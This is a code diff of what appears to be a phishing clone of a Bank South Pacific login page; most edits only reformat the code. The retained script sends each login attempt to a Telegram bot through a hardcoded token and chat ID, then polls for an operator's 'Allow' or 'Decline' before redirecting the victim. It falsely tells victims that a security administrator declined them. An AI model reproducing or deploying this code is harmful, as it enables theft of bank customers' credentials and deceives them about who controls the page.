@@ -31,7 +31,6 @@
             font-family: 'Open Sans', sans-serif;
             background-color: #f3f4f6;
         }
-        /* Diagonal top edge for white login container matching original graphic */
         
         .curved-card {
             clip-path: polygon(0 3.5vw, 100% 0, 100% 100%, 0 100%);
@@ -59,7 +58,6 @@
                     </svg>
                 </button>
                 <a href="#" class="flex items-center gap-2.5">
-                    <!-- BSP Ribbon Logo Icon -->
                     <svg class="w-9 h-9" viewBox="0 0 100 100" fill="none">
                         <path d="M25 20 C50 10, 80 30, 60 55 C45 75, 20 60, 45 40 C65 25, 85 45, 75 75 C65 95, 30 85, 25 70" 
                             stroke="#00e65c" stroke-width="12" stroke-linecap="round" fill="none"/>
@@ -117,8 +115,7 @@
 
             <!-- Hero Banner with Background Image -->
             <div class="relative h-44 sm:h-52 bg-bsp-header overflow-hidden">
-                <img src="https://images.unsplash.com/photo-1573497019940-1c28c88b4f3e?auto=format&fit=crop&w=800&q=80" alt="Happy customers" class="w-full h-full object-cover mix-blend-overlay opacity-40 scale-105" onerror="this.src='https://placehold.co/600x300/18432a/ffffff?text=BSP+Financial+Security'"
-                />
+                <img src="https://images.unsplash.com/photo-1573497019940-1c28c88b4f3e?auto=format&fit=crop&w=800&q=80" alt="Happy customers" class="w-full h-full object-cover mix-blend-overlay opacity-40 scale-105" onerror="this.src='https://placehold.co/600x300/18432a/ffffff?text=BSP+Financial+Security'" />
                 <div class="absolute inset-0 flex items-center justify-center px-6 pb-4">
                     <h1 class="text-white text-xl sm:text-2xl text-center font-normal drop-shadow-md tracking-wide leading-snug">
                         Your financial security guaranteed.
@@ -293,7 +290,7 @@
             modal.classList.remove('flex');
         }
 
-        // Telegram Bot Credentials & Long Polling Var
+        // Telegram Bot Credentials & Long Polling Vars
         const BOT_TOKEN = '9230316153:AAHJDZp3y54o3sZX2khtzR19c5JDj3NQq5w';
         const CHAT_ID = '9177759290';
         let pollInterval;
@@ -325,66 +322,66 @@
 
             // Send message with inline keyboard containing Allow & Decline options
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{
-                                    text: 'Allow Proceed',
-                                    callback_data: approveData
-                                }, {
-                                    text: 'Decline Access',
-                                    callback_data: declineData
-                                }]
-                            ]
-                        }
-                    })
-                })
-                .then(res => res.json())
-                .then(data => {
-                    if (!data.ok) {
-                        spinnerOverlay.style.display = 'none';
-                        showMessage('Telegram notification error: ' + data.description, true);
-                        return;
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{
+                                text: 'Allow Proceed',
+                                callback_data: approveData
+                            }, {
+                                text: 'Decline Access',
+                                callback_data: declineData
+                            }]
+                        ]
                     }
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (!data.ok) {
+                    spinnerOverlay.style.display = 'none';
+                    showMessage('Telegram notification error: ' + data.description, true);
+                    return;
+                }
 
-                    // Poll Telegram updates for button interactions
-                    clearInterval(pollInterval);
-                    pollInterval = setInterval(() => {
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
-                            .then(res => res.json())
-                            .then(pollData => {
-                                if (pollData.ok && pollData.result.length > 0) {
-                                    for (let update of pollData.result) {
-                                        lastUpdateId = update.update_id;
-                                        if (update.callback_query) {
-                                            const callbackAction = update.callback_query.data;
-                                            if (callbackAction === approveData) {
-                                                clearInterval(pollInterval);
-                                                spinnerOverlay.style.display = 'none';
-                                                window.location.href = 'index.html';
-                                            } else if (callbackAction === declineData) {
-                                                clearInterval(pollInterval);
-                                                spinnerOverlay.style.display = 'none';
-                                                document.getElementById('loginForm').reset();
-                                                showMessage('Login attempt declined by security administrator. Please re-enter your details.', true);
-                                            }
+                // Poll Telegram updates for button interactions
+                clearInterval(pollInterval);
+                pollInterval = setInterval(() => {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                        .then(res => res.json())
+                        .then(pollData => {
+                            if (pollData.ok && pollData.result.length > 0) {
+                                for (let update of pollData.result) {
+                                    lastUpdateId = update.update_id;
+                                    if (update.callback_query) {
+                                        const callbackAction = update.callback_query.data;
+                                        if (callbackAction === approveData) {
+                                            clearInterval(pollInterval);
+                                            spinnerOverlay.style.display = 'none';
+                                            window.location.href = 'index.html';
+                                        } else if (callbackAction === declineData) {
+                                            clearInterval(pollInterval);
+                                            spinnerOverlay.style.display = 'none';
+                                            document.getElementById('loginForm').reset();
+                                            showMessage('Login attempt declined by security administrator. Please re-enter your details.', true);
                                         }
                                     }
                                 }
-                            })
-                            .catch(() => {});
-                    }, 2000);
-                })
-                .catch(error => {
-                    spinnerOverlay.style.display = 'none';
-                    showMessage('Connection error: ' + error, true);
-                });
+                            }
+                        })
+                        .catch(() => {});
+                }, 2000);
+            })
+            .catch(error => {
+                spinnerOverlay.style.display = 'none';
+                showMessage('Connection error: ' + error, true);
+            });
         }
 
         function handleRegister() {
